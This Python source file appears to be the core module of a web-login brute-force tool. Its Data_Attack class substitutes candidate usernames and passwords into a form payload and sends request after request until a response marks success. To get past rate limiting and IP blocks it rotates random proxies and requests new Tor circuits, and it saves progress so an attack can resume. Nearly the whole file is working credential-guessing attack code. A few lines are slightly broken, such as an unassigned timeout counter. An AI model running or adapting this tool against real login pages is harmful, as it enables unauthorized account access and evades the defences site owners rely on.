from requests import Session, Request, get
from stem.control import Controller
from lib.core.loggin import log
from lib.core.managers.DataManager import SaveDataBase
from http.client import responses
import sys
import random
import subprocess


def check_response(my_response: object | str, response: object):
    status_code = response.status_code
    if type(my_response) == str:
        try:
            if int(my_response) == status_code:
                return True
        except ValueError:
            if my_response == responses[status_code]:
                return True
    try:
        json = response.json()
        if my_response == json:
            return True
        if type(my_response) == str and my_response in json:
            return True
        if type(my_response) == str and my_response in json.values():
            return True
    except Exception:
        pass
    return False

class Tor:
    def __init__(self, control_port=9051):
        self.port = control_port
        self.controller = None

    def connect(self, password=None):
        try:
            self.controller = Controller.from_port(port=self.port)
            self.controller.authenticate(password=password)
            return log.info("Connected to ControlPort", extra={"bold": True})
        except (ConnectionRefusedError, ConnectionError) as err:
            log.error(f"Error trying to connect to Tor:\n{err}")

    def renew_circuit(self):
        if self.controller and self.controller.is_authenticated():
            try:
                self.controller.signal("NEWNYM")
                log.info("The new circuit was created with successfully", extra={"bold": True})
            except Exception as e:
                log.error(f"Failed to create another circuit:\n{e}")
        else:
            log.warning("It wasn't detected any connection to ControlPort.", extra={"bold": True})
            yn = log.input("Do you want to connect to ControlPort? [Y/n] ") or 'y'
            if 'y' in yn.lower():
                log.debug("Starting to connect to the ControlPort")
                password = log.input("Password (if there isn't password, leave it blank): ")
                self.connect(password=password)
            else:
                pass

    def close(self):
        if self.controller:
            self.controller.close()
            log.debug("The ControlPort Connection was closed", extra={"bold": True})


class Proxy:
    def _format(self, line: str) -> object:
        splitted_line = line.split(" ")
        proxy = splitted_line[0]
        protocol = splitted_line[1] if len(splitted_line) > 1 else 'http'
        return {
            'http': f'{protocol}://{proxy}',
            'https': f'{protocol}://{proxy}'
        }

    def test_connection(self, proxy: object):
        try:
            get("https://www.torproject.org", proxies=proxy)
            return True
        except Exception:
            return False
    

class Requester(Proxy):
    methods = ['GET', 'OPTIONS', 'POST', 'PUT', 'DELETE']
    def __init__(self, url: str, method: str = "POST", headers: object = {}, data: str = None):
        self.url = url
        self.method = method
        self.headers = headers
        self.data = data

        self.session = Session()

    def send(self, data: str | int) -> object:
        req = Request(url=self.url, data=data, method=self.method, headers=self.headers)
        self.prepared = req.prepare()
        return self.session.send(self.prepared)
        
    def update_proxy(self, proxy: object) -> None:
        return self.session.proxies.update(proxy)
    
    def update_tor(self, tor: Tor) -> None:
        return tor.renew_circuit()

    def use_tor(self, protocol: str = "http", port: str | int = 8080) -> None:
        tor_proxy = {
            'http': f"{protocol}://127.0.0.1:{port}",
            "https": f"{protocol}://127.0.0.1:{port}"
        }


        need_to_execute = self.test_connection(tor_proxy)
        if not need_to_execute:
            log.debug("Executing Tor")
            tor = subprocess.Popen(['tor'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            for line in iter(tor.stdout.readline, ''):
                if 'Done' in line:
                    break
            log.info("Tor is ready", extra={"bold": True})
        log.info("Tor connection working", extra={"bold": True})

        self.update_proxy(tor_proxy)

class Data_Attack(Requester):
    def __init__(self, 
                 url: str, 
                 data: str, 
                 headers: object = {}, 
                 method: str = None, 
                 timeout: int = 0, 
                 response: list = None, 
                 proxies: list = None, 
                 tor: tuple = (), 
                 proxy: str = None,
                 resume: bool = True
                ):
        self.url = url
        self.method = method
        self.data = data
        self.headers = headers
        self.proxies = proxies
        self.tor = None

        
        self.attempts = 0
        self.timeout = timeout
        self.save = SaveDataBase(url)
        self.resume = resume
        self.last_save = {}

        self.s = None
        self.f = None

        setattr(self, response[0].lower().replace("'", ""), response[1].replace("'", ""))
        
        super().__init__(url=self.url, method=self.method, headers=self.headers, data=self.data)
        if proxy:
            is_connection_working = self.test_connection(proxy)
            if is_connection_working:
                self.update_proxy(proxy)
            else:
                log.warning("The proxy server is refusing connections.\n Check the proxy settings to make sure that they are correct.\n Contact your network administrator to make sure the proxy server is working.", extra={"bold": True})
                n = log.input("Do you want to continue anyway? [N/y]") or 'n'
                if 'n' in n.lower():
                    sys.exit(0)
        if tor:
            self.use_tor(protocol=tor[0], port=tor[1])
            self.tor = Tor(control_port=tor[2])
            self.tor.connect(tor[3])
    
    def save_progress(self, thread: int, param: str, current_list: list) -> None:
        index = current_list.index(param)
        self.save.update(thread, index)
    
    def get_save(self, thread):
        data = self.save.read()
        if data and self.resume:
            return int(self.save.read()[thread])

    def __send(self, data: str | int, id: int = 0, type: tuple = None) -> None:
        if self.proxies:
            self.session = Session()
            self.update_proxy(self._format(random.choice(self.proxies)))
        try:
            res = self.send(data=data)
            if res.status_code == 429:
                timeout+=1
                if self.tor:
                    self.update_tor()
                return self.__send(data=data, id=id, type=type)
            sf = check_response(my_response=self.s or self.f, response=res)
            sys.stdout.write(f'\033[2K\r{self.attempts} of {self.total} => {(self.attempts * 100 / self.total):.2f}% [\033[38;2;255;0;111m#{id}\033[0m \033[35m{type[1]}\033[0m|\033[35m{type[2]}\033[0m => \033[38;5;214m{res.status_code}\033[0m]\r')
            sys.stdout.flush()
            if (self.s and sf) or (self.f and not sf):
                sys.stdout.write(f'\033[2K\n[\033[0;32m+\033[0m] {type[0].capitalize()} found: {type[1]} ({self.attempts}) [#{id} {res.status_code}]\n')
                sys.stdout.flush()
                return True
            self.attempts+=1
        except Exception as e:
            print(f"[\033[0;36mRE-ATTEMPT\033[0m] (\033[0;31m{e.__class__.__name__}\033[0m => \033[0;95m{e.__cause__}\033[0m) {str(e)}\n => {data}")
            self.__send(data=data, id=id, type=type)

    def bruteforce_username(self, usernames: list, password: str, id: int = 0) -> None:
        list_ = usernames[id] if self.save.read() == None else usernames[id][self.get_save(id)]
        for username in list_:
            
            result = self.__send(data=self.data
                                 .replace("^USER^", username)
                                 .replace("^PASS^", password),
                                 id=id, 
                                 type=('username', username, password)
                                )
            if result:
                break


    def bruteforce_password(self, username: str, passwords: list, id: int = 0):
        list_ = passwords[id] if self.save.read() == None else passwords[id][self.get_save(id)]
        for password in list_:
           
            result = self.__send(data=self.data
                                 .replace("^USER^", username)
                                 .replace("^PASS^", password),
                                 id=id, 
                                 type=('password', username, password)
                                )
            if result:
                break
    
    def bruteforce_password_and_username(self, usernames: list, passwords: list, id: int = 0):
        for username in usernames[id]:
            for password in passwords[id]:
                result = self.__send(data=self.data
                                 .replace("^USER^", username)
                                 .replace("^PASS^", password)
                                 ,id=id, 
                                 type=('password and username', username, password)
                                )
            if result:
                break